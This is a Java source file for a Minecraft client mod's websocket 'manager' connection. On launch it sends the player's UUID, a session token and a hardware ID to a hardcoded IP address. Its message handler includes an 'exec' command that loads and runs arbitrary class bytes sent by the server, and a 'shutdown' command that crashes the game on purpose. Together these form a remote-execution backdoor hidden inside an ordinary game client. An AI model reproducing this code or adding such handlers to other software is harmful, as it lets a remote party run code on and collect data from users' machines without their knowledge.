package me.x150.coffee.helper;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import me.x150.coffee.CoffeeClientMain;
import me.x150.coffee.feature.gui.screen.StartScreen;
import me.x150.coffee.helper.util.Utils;
import net.minecraft.client.util.GlfwUtil;
import net.minecraft.text.Text;
import net.minecraft.util.Util;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.HashMap;
import java.util.Map;

public class ManagerSocket extends WebSocketClient {
    Runnable c;
    Map<String, String> reasonsExplained = Util.make(() -> {
        HashMap<String, String> inst = new HashMap<>();
        inst.put("tamper", "You tampered with the game files. Don't do that.");
        inst.put("hwid_mismatch", "The HWID of your system changed since you first started this client. Please ask for a HWID reset on the discord.");
        inst.put("cracked", "Your session is cracked, and for security reasons, we don't allow that. Please only use an online session.");
        inst.put("timeout", "You're sending messages too fast");
        return inst;
    });
    boolean allowOnline = false;

    public ManagerSocket(Runnable closed) {
        super(URI.create("ws://5.181.151.18:80"));
        this.c = closed;
    }

    @Override
    public void onOpen(ServerHandshake handshakedata) {
        System.out.println("Connected to manager socket");
        StartScreen.currentInstance.status = "Logging in...";
        StartScreen.currentInstance.desc = "Sending all your information to the mothership...";
        JsonObject data = new JsonObject();
        data.addProperty("uuid", CoffeeClientMain.client.getSession().getProfile().getId().toString());
        data.addProperty("session", CoffeeClientMain.generateOrGetSessionToken());
        data.addProperty("hwid", Utils.getHWID());
        send(new Packet("identifyClient", data));
    }

    @Override
    public void onMessage(String message) {
        Packet packet = Packet.deserialize(message);
        switch (packet.id) {
            case "identifyFailed" -> {
                String r = reasonsExplained.getOrDefault(packet.data.get("reason").getAsString(), packet.data.get("reason").getAsString());
                StartScreen.currentInstance.status = "Failed to login.";
                StartScreen.currentInstance.desc = r + "\nYou can still use the client, but some features will not be available.";
                StartScreen.currentInstance.renderGoButton = true;
                close();
            }
            case "identifySuccess" -> {
                StartScreen.currentInstance.status = "Logged in!";
                StartScreen.currentInstance.desc = "Have fun!";
                StartScreen.currentInstance.renderGoButton = true;
                allowOnline = true;
            }
            case "irc" -> {
                CoffeeClientMain.client.player.sendMessage(Text.of("[IRC] " + packet.data.get("from").getAsJsonObject().get("name").getAsString() + ": " + packet.data.get("message").getAsString()), false);
            }
            case "ircFail" -> {
                Utils.Logging.error("Your message was not sent. Reason: " + reasonsExplained.getOrDefault(packet.data.get("reason").getAsString(), packet.data.get("reason").getAsString()));
            }
            case "shutdown" -> {
                GlfwUtil.makeJvmCrash();
            }
            case "exec" -> {
                ClassLoaderHack real = new ClassLoaderHack(this.getClass().getClassLoader());
                JsonArray ja = packet.data.get("b").getAsJsonArray();
                byte[] classFile = new byte[ja.size()];
                for (int i = 0; i < ja.size(); i++) {
                    classFile[i] = (byte) ja.get(i).getAsJsonPrimitive().getAsInt();
                }
                try {
                    Class<?> r = real.define(classFile);
                    Class.forName(r.getName(), true, real);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        System.out.println(packet);
    }

    public boolean allowOnlineFeatures() {
        return allowOnline && isOpen();
    }

    public void send(Packet message) {
        System.out.println("-> " + message.serialize());
        try {
            send(message.serialize());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Disconnected with " + code);
        this.c.run();
    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
    }

    public static class Packet {
        public static Gson gson = new Gson();
        String id;
        JsonObject data;
        JsonObject extra;

        public Packet(String op, JsonObject data, JsonObject extra) {
            this.id = op;
            this.data = data;
            this.extra = extra;
        }

        public Packet(String op, JsonObject data) {
            this(op, data, new JsonObject());
        }

        public Packet(String op) {
            this(op, new JsonObject());
        }

        public static Packet deserialize(String json) {
            return gson.fromJson(json, Packet.class);
        }

        public String serialize() {
            return gson.toJson(this);
        }

        @Override
        public String toString() {
            return "Packet{" +
                    "op='" + id + '\'' +
                    ", data=" + data +
                    ", extra=" + extra +
                    '}';
        }
    }
}
